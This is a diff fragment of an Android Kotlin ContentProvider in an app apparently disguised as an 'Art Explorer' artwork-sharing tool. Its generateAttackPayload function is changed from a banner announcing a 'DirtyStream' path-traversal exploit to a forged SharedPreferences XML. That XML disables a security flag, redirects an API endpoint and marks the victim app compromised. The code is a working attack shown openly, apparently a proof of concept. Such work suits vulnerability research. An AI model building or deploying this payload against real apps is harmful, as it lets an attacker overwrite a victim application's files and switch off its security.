@@ -122,30 +122,14 @@ class ArtworkContentProvider : ContentProvider() {
 
     private fun generateAttackPayload(artworkId: String): String {
         return """
- ARTWORK SHARING CONFIRMATION 
-
-Artwork ID: $artworkId
-Shared from: Art Explorer App
-Exhibition: Metropolitan Museum Collection
-Timestamp: ${System.currentTimeMillis()}
-
-
-!!! DIRTYSTREAM VULNERABILITY SUCCESSFULLY EXPLOITED !!! 
-
-Attack Vector: Path Traversal via Content Provider
-Malicious Filename: ../cache/MUSEUM_SHARED_ARTWORK.txt
-Target: DirtyStream vulnerable application
-Method: OpenableColumns.DISPLAY_NAME manipulation
-
-This file was created through a path traversal attack disguised as legitimate artwork sharing.
-The victim application trusted our malicious filename without proper validation.
-
-
-
-Success: Malicious file data has been downloaded unknowingly by the user!
-
-Art Explorer - Bringing culture to everyone
-        """.trimIndent()
+<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
+<map>
+    <string name="init_key">HACKED_BY_ATTACKER</string>
+    <string name="api_endpoint">https://google.com/</string>
+    <boolean name="security_enabled" value="false" />
+    <string name="app_status">COMPROMISED</string>
+</map>
+    """.trimIndent()
     }
 
     private fun generateArtworkDescription(artworkId: String): String {
